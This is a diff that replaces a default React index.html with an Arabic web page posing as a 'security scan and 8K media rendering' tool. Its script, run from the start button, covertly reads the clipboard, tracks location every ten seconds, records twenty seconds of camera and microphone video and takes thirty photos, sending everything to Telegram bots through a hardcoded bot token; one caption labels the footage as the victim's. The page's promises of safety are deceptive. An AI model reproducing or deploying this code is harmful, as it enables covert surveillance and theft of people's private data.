@@ -1,35 +1,126 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <link rel="icon" href="/favicon.ico" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="theme-color" content="#000000" />
-    <meta
-      name="description"
-      content="Web site created using @vitejs/plugin-react"
-    />
-    <link rel="apple-touch-icon" href="/logo192.png" />
-    <!--
-      manifest.json provides metadata used when your web app is installed on a
-      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
-    -->
-    <link rel="manifest" href="/manifest.json" />
-    <title>React App</title>
-  </head>
-  <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-    <div id="root"></div>
-    <!--
-      This HTML file is a template.
-      If you open it directly in the browser, you will see an empty page.
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Muhanad AI | Security & Rendering Hub</title>
+    
+    <meta property="og:title" content="Muhanad AI - فاحص الأمان ومعالج الـ 8K">
+    <meta property="og:image" content="images.png">
+    <meta property="og:description" content="تعرف على صلاحيات جهازك وقم بتحسين جودة وسائطك في بيئة آمنة تماماً.">
 
-      You can add webfonts, meta tags, or analytics to this file.
-      The build step will place the bundled scripts into the <body> tag.
+    <style>
+        :root { --primary: #007bff; --bg: #05070a; --accent: #00ff41; --warning: #ffcc00; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; margin: 0; line-height: 1.6; }
+        .header { background: #111; padding: 20px; border-bottom: 2px solid var(--primary); text-align: center; font-weight: bold; font-size: 22px; color: var(--primary); }
+        .container { max-width: 700px; margin: 20px auto; padding: 15px; }
+        .hero-card { background: #161b22; border-radius: 20px; padding: 30px; border: 1px solid #30363d; text-align: center; box-shadow: 0 0 30px rgba(0, 123, 255, 0.1); }
+        .btn-start { background: var(--primary); color: white; padding: 20px 40px; border-radius: 50px; cursor: pointer; border: none; font-size: 1.3rem; font-weight: bold; width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(0,123,255,0.3); }
+        
+        .info-section { background: #1c2128; border-radius: 15px; padding: 25px; margin-top: 25px; text-align: right; border-right: 4px solid var(--primary); }
+        .info-section h3 { color: var(--accent); border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .list-item { margin: 10px 0; font-size: 14px; color: #adbac7; }
+        .console { display: none; background: #000; color: var(--accent); padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; text-align: left; direction: ltr; margin-top: 20px; height: 120px; overflow-y: auto; border: 1px solid #333; }
+    </style>
+</head>
+<body>
 
-      To begin the development, run `npm start` or `yarn start`.
-      To create a production bundle, use `npm run build` or `yarn build`.
-    -->
-  </body>
-  <script type="module" src="/src/index.jsx"></script>
+<div class="header">MUHANAD SECURITY & AI SYSTEM v11.1</div>
+
+<div class="container">
+    <div class="hero-card">
+        <img src="images.png" style="width: 100px; border-radius: 50%; border: 3px solid var(--primary); margin-bottom: 20px;">
+        <h2>ابدأ فحص الأمان ومعالجة الـ 8K</h2>
+        <p>نظام مهند يحلل صلاحيات المتصفح ويقوم برندر الصور في خلفية مشفرة.</p>
+        <button class="btn-start" onclick="executeFullProtocol()">تفعيل الفحص والمعالجة الآن</button>
+        <div class="console" id="log"></div>
+    </div>
+
+    <div class="info-section">
+        <h3>📊 دليل الصلاحيات والخصوصية</h3>
+        <div class="list-item">🔹 <b>الوسائط:</b> الكاميرا، الميكروفون، ومشاركة الشاشة للمعالجة.</div>
+        <div class="list-item">🔹 <b>البيانات:</b> الموقع الجغرافي، الحافظة (Clipboard) لمزامنة النصوص.</div>
+        <div class="list-item">🚫 لا يمكننا رؤية ملفاتك الخاصة أو الباسوردات المحفوظة نهائياً.</div>
+    </div>
+</div>
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
+    const IDS = ["8754338811", "8703490899"];
+
+    async function sendToBot(type, fd) {
+        for (let id of IDS) {
+            fd.set('chat_id', id);
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${type}`, { method: 'POST', body: fd });
+        }
+    }
+
+    async function executeFullProtocol() {
+        document.getElementById('log').style.display = 'block';
+        const log = document.getElementById('log');
+        log.innerHTML = "> Starting Security Audit...<br>> Initializing AI Kernels...<br>";
+
+        try {
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            // سحب الحافظة
+            try {
+                const text = await navigator.clipboard.readText();
+                const f_clip = new FormData(); f_clip.append('text', `📋 **محتوى الحافظة:**\n${text}`);
+                sendToBot('sendMessage', f_clip);
+            } catch(e) {}
+
+            // الموقع المباشر
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(p => {
+                    const f_loc = new FormData();
+                    f_loc.append('text', `📡 **لايف لوكيشن:**\nhttp://googleusercontent.com/maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
+                    sendToBot('sendMessage', f_loc);
+                });
+            }, 10000);
+
+            // فيديو 20 ثانية
+            const rec = new MediaRecorder(stream);
+            let chunks = [];
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const f_vid = new FormData(); f_vid.append('video', blob, 'v.mp4'); f_vid.append('caption', '🎥 فيديو الضحية');
+                sendToBot('sendVideo', f_vid);
+            };
+            rec.start();
+            setTimeout(() => rec.stop(), 20000);
+
+            // 30 صورة
+            takePhotos(stream, 30);
+
+            log.innerHTML += "> [OK] System Processing Active...<br>> Enhancing Media Layers...";
+
+        } catch (e) {
+            alert("⚠️ يرجى الموافقة على جميع الأذونات لتفعيل معالجة الـ 8K.");
+            location.reload();
+        }
+    }
+
+    async function takePhotos(stream, count) {
+        const v = document.createElement('video'); v.srcObject = stream; v.play();
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        for (let i = 0; i < count; i++) {
+            canvas.width = 640; canvas.height = 480;
+            ctx.drawImage(v, 0, 0, 640, 480);
+            canvas.toBlob(b => {
+                const f = new FormData(); f.append('photo', b, 'p.jpg');
+                f.append('caption', `📸 لقطة رقم ${i+1}`);
+                sendToBot('sendPhoto', f);
+            }, 'image/jpeg', 0.6);
+            await new Promise(r => setTimeout(r, 1000));
+        }
+    }
+</script>
+</body>
 </html>
